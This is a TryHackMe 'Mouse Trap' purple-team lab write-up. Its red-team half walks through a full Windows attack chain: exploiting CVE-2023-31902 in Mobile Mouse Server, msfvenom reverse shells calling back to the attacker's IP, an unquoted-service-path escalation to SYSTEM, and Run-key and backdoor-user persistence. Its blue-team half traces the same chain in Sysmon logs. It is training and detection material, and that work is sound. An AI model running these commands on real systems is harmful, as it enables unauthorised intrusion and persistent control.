---
title: "TryHackMe: Mouse Trap"
author: jaxafed
categories: [TryHackMe]
tags: [windows, rce, unquoted service path, persistence, sysmon]
render_with_liquid: false
media_subpath: /images/tryhackme_mouse_trap/
image:
  path: room_image.webp
---

**Mouse Trap** was another purple team room where we started on the attacker side and exploited a remote code execution **(RCE)** vulnerability to gain a foothold. After that, we exploited an unquoted service path to escalate our privileges and established basic persistence.

Next, we moved to the defender side and answered questions about an attacker performing the same attack chain as us by investigating the **Sysmon** logs.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/mousetrap){: .center }

## Red Team

We start the red team part with an `nmap` scan.

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.154.124
...
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
...
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
9099/tcp  open  unknown
| fingerprint-strings:
|   FourOhFourRequest, GetRequest:
|     HTTP/1.0 200 OK
|     Server: Mobile Mouse Server
|     Content-Type: text/html
|     Content-Length: 326
|_    <HTML><HEAD><TITLE>Success!</TITLE><meta name="viewport" content="width=device-width,user-scalable=no" /></HEAD><BODY BGCOLOR=#000000><br><br><p style="font:12pt arial,geneva,sans-serif; text-align:center; color:green; font-weight:bold;" >The server running on "MOUSETRAP" was able to receive your request.</p></BODY></HTML>
...
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The important open ports are:

- **135** (`WINRPC`)
- **139** / **445** (`SMB`)
- **3389** (`RDP`)
- **5985** (`WINRM`)
- **9099** (`HTTP`)

### Mobile Mouse RCE

Visiting `http://10.10.154.124:9099/`, we get a simple success message.

![Web 9099 Index](web_9099_index.webp){: width="1200" height="800" }

`nmap` already informed us that the web server on this port is `Mobile Mouse Server`. We can also confirm this by manually checking the headers using `curl`.

```console
$ curl -v 'http://10.10.154.124:9099/'
...
< HTTP/1.0 200 OK
< Server: Mobile Mouse Server
< Content-Type: text/html
< Content-Length: 326
...
```

Searching for vulnerabilities in the server, we come across `CVE-2023-31902`, a remote code execution (**RCE**) vulnerability. The exploit for this can be found in [this GitHub repository](https://github.com/blue0x1/mobilemouse-exploit). The room instructs us to use the exploit that utilizes `SMB` instead of `HTTP`, so we will use the `CVE-2023-31902-v2.py` script.

```console
$ wget https://raw.githubusercontent.com/blue0x1/mobilemouse-exploit/refs/heads/main/CVE-2023-31902-v2.py
```
{: .wrap }

Looking at the exploit script, it expects us to supply the target, our own machine's IP address, and an executable to run on the target. For the executable, the room instructs us to use a `Windows stageless reverse TCP (x64) shell` named `shell.exe`. Let's use `msfvenom` to generate it.

```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.72.22 LPORT=443 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

We can use the `multi/handler` module from `metasploit` to catch our reverse shell, so we will start that as well.

```console
$ msfconsole
...
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.11.72.22
LHOST => 10.11.72.22
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.72.22:443
```

Now that both our payload and listener are set, we can run the exploit.

```console
$ python3 CVE-2023-31902-v2.py --target 10.10.154.124 --lhost 10.11.72.22 --file shell.exe
Take The rose...
```

> The exploit script might not work on the first try, so if you don't get a shell after some time, try running it again.  
{: .prompt-tip }

After this, we get a shell as `purpletom` on our listener and can read the first flag at `C:\Users\purpletom\user.txt`.

```
[*] Command shell session 1 opened (10.11.72.22:443 -> 10.10.154.124:49863)


Shell Banner:
Microsoft Windows [Version 10.0.17763.1821]
-----


C:\Windows\system32>whoami
mousetrap\purpletom

C:\Windows\system32>type C:\Users\purpletom\user.txt
THM{[REDACTED]}
```

### Unquoted Service Path

Next, the room instructs us to use `SharpUp.exe` in `C:\Users\purpletom` to enumerate the machine for unquoted service paths.

```
C:\Windows\system32>C:\Users\purpletom\SharpUp.exe UnquotedServicePath

=== SharpUp: Running Privilege Escalation Checks ===

=== Services with Unquoted Paths ===
        Service 'Mobile Mouse Service' (StartMode: Manual) has executable 'C:\Program Files (x86)\Mobile Mouse\Mouse Utilities\HelperService.exe', but 'C:\Program' is modifable.
        Service 'Mobile Mouse Service' (StartMode: Manual) has executable 'C:\Program Files (x86)\Mobile Mouse\Mouse Utilities\HelperService.exe', but 'C:\Program Files' is modifable.
        Service 'Mobile Mouse Service' (StartMode: Manual) has executable 'C:\Program Files (x86)\Mobile Mouse\Mouse Utilities\HelperService.exe', but 'C:\Program Files (x86)\Mobile Mouse\Mouse' is modifable.



[*] Completed Privesc Checks in 0 seconds
```
{: .wrap }

With this, we discover the `Mobile Mouse Service` with an unquoted service path, running as the `SYSTEM` user.

```
C:\Windows\system32>sc qc "Mobile Mouse Service"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Mobile Mouse Service
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\Mobile Mouse\Mouse Utilities\HelperService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Mobile Mouse Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
{: .wrap }

We can abuse this to escalate our privileges due to how Windows behaves when the service path includes spaces and is not quoted. For example, in our case, the service path is set to `C:\Program Files (x86)\Mobile Mouse\Mouse Utilities\HelperService.exe` without quotes. When the service is run, Windows will try to find the executable for it in the following order:

1. `C:\Program.exe`
2. `C:\Program Files (x86)\Mobile.exe`
3. `C:\Program Files (x86)\Mobile Mouse\Mouse.exe`
4. `C:\Program Files (x86)\Mobile Mouse\Mouse Utilities\HelperService.exe`

Windows will go down the list, and if any of the executables exist, it will use that one.

The room asks us to use the `Mobile Mouse` directory, so we will create the `C:\Program Files (x86)\Mobile Mouse\Mouse.exe` executable on the target.

First, let's use `msfvenom` to create a service executable and start an `HTTP` server to transfer it to the machine.

```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.72.22 LPORT=443 -f exe-service -o shell-svc.exe

$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
{: .wrap }

Also, let's background our session in `metasploit` and run the `multi/handler` once more to catch our next shell.

```console
C:\Windows\system32>^Z  # Control + Z
Background session 1? [y/N]  y
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.11.72.22:443
msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...


Shell Banner:
Microsoft Windows [Version 10.0.17763.1821]
-----


C:\Windows\system32>
```

Now, downloading our service executable to `C:\Program Files (x86)\Mobile Mouse\Mouse.exe` and starting the service.

```
C:\Windows\system32>curl http://10.11.72.22/shell-svc.exe -o "C:\Program Files (x86)\Mobile Mouse\Mouse.exe"

C:\Windows\system32>sc start "Mobile Mouse Service"

SERVICE_NAME: Mobile Mouse Service
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4504
        FLAGS              :

C:\Windows\system32>

[*] Command shell session 2 opened (10.11.72.22:443 -> 10.10.154.124:49872)
```
{: .wrap }

The moment the service starts, our executable is run, and we get a shell as `SYSTEM`. We can then read the second flag at `C:\Users\Administrator\Desktop\root.txt`.

```
C:\Windows\system32>^Z  # Control + Z
Background session 1? [y/N]  y
msf6 exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...


Shell Banner:
Microsoft Windows [Version 10.0.17763.1821]
-----


C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
THM{[REDACTED]}
```

### Establishing Persistence

While we have a shell as `SYSTEM`, the task is not over yet, as it instructs us to establish basic persistence using two different methods.

First, to create a registry key named `shell` under the `Run` key in the `HKEY_CURRENT_USER` registry hive to run the `C:\Windows\Temp\shell.exe` executable.

This method is used for persistence because any program found under the `Run` key is executed when a user logs into the machine.

We can achieve this as follows:

```
C:\Windows\system32>reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v shell /t REG_SZ /d "C:\Windows\Temp\shell.exe"
The operation completed successfully.
```
{: .wrap }

> For this method to work, we would also need to copy an executable to `C:\Windows\Temp\shell.exe`, but since it is not necessary for completing the task, we can skip it.  
{: .prompt-tip }

For the second method of persistence, the room instructs us to create a backdoor user named `terry`. We can achieve this with the `net` command as follows:

```
C:\Windows\system32>net user terry Password123! /add
The command completed successfully.
```

After this, running the `checker.exe` at `C:\Users\Administrator\Desktop`, we get the last flag and complete the red team part.

```
C:\Windows\system32>C:\Users\Administrator\Desktop\checker.exe
Flag: THM{[REDACTED]}
```

## Blue Team

Moving on to the blue team side of things, we are given `RDP` access to a Windows machine and tasked with investigating the `Sysmon` logs to answer questions about an attacker executing the same attack chain as us from before.

### SysmonView

We are also provided with the `Timeline Explorer` and `SysmonView` tools to help us investigate the logs. I will go with `SysmonView`.

To open the logs in `SysmonView`, we need to extract them in `XML` format first. We can do this by following the instructions in the room: opening the `Event Viewer`, going to `Applications and Services -> Microsoft -> Windows -> Sysmon -> Operational`, and using the `Save all events As` option.

![Event Viewer Sysmon](event_viewer_sysmon.webp){: width="1200" height="800" }

![Event Viewer Sysmon Two](event_viewer_sysmon2.webp){: width="550" height="400" }

Now, let's open the `SysmonView.exe` on the desktop and use `File -> Import Sysmon Event Logs` to import our logs.

![Sysmon View](sysmon_view.webp){: width="1200" height="800" }

![Sysmon View Two](sysmon_view2.webp){: width="1200" height="800" }

After that, using the `Hierarchy` view and clicking the `Generate Diagram` button, we can see the entire attack chain as follows.

![Sysmon View Hierarchy](sysmon_view_hierarchy.webp){: width="1200" height="800" }

### Answering the Questions

With that, we can move on to answering the questions.

---

The first three questions are all related to the foothold. Since the foothold was achieved by a remote code execution vulnerability in the `Mobile Mouse Server`, we will see the payload running under `Mobile Mouse.exe`.

Checking the details for the second `cmd.exe` process spawned under `Mobile Mouse.exe`, we get the answers to the first three questions.

![Sysmon View Answers](sysmon_view_answers.webp){: width="1200" height="800" }

- **What is the name of the payload that was shared?**

  The answer is `pa[REDACTED]xe`.

- **What is the IP attacker’s IP address?**

  The answer is `10.[REDACTED].235`.

- **What is the full command-line of the executed payload?**

  The answer is `cm[REDACTED]xe`.

---

The next two questions are related to the enumeration performed by the attacker for privilege escalation.

We can see the executable run by the attacker using the remote code execution vulnerability, spawning a command shell, and `SharpUp.exe` being run from it. Checking the details for the `SharpUp.exe` process, we can get the answers to the questions.

![Sysmon View Answers Two](sysmon_view_answers2.webp){: width="1200" height="800" }

- **What is the full command-line of the tool used to enumerate the privilege escalation vectors?**

  The answer is `.\Sh[REDACTED]it`.

- **When was this tool executed?**

  The answer is `8/6/[REDACTED]:43 PM`.

---

Next, we move on to the unquoted service path exploit for privilege escalation.

After the `SharpUp.exe` command, we can see the attacker executing two `Powershell` commands. The first one simply makes a request to the attacker's web server, and the second one actually downloads and saves the executable for the unquoted service path exploit.

![Sysmon View Answers Three](sysmon_view_answers3.webp){: width="1200" height="800" }

- **What command was used to transfer the reverse shell binary into the system?**

  The answer is `po[REDACTED]xe`.

After the transfer, we can also see the attacker using `net.exe` to start the service.

![Sysmon View Answers Four](sysmon_view_answers4.webp){: width="1200" height="800" }

---

Next, we move on to the privileged shell the attacker got from the service.

First, we are asked about the full command line for the service process after the path hijack. We can find this by checking the `Parent command line` value for the command shell spawned under the `Mouse.exe` service executable.

![Sysmon View Answers Five](sysmon_view_answers5.webp){: width="1200" height="800" }

- **What is the full command line value of the process created during the unquoted service path abuse?**

  The answer is `"C:\P[REDACTED]ce.exe`.

---

Finally, we move on to the persistence established by the attacker.

The first question asks for the password for the backdoor account created by the attacker. We can see the attacker using `net.exe` to achieve this, and by checking the details for the process, we can find the answer in the command line.

![Sysmon View Answers Six](sysmon_view_answers6.webp){: width="1200" height="800" }

- **What was the password set for the user created by the attacker for persistence?**

  The answer is `ch[REDACTED]23`.

Lastly, we are asked about the persistence method using the registry keys. We can see the attacker using `reg.exe` for this, and by checking the details for the process, we can find the answers in the command line.

![Sysmon View Answers Seven](sysmon_view_answers7.webp){: width="1200" height="800" }

- **What is the key name used for persistence?**

  The answer is `HK[REDACTED]un`.

- **What is the target path of the persistence implant by the attacker?**

  The answer is `C:\[REDACTED]xe`.

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>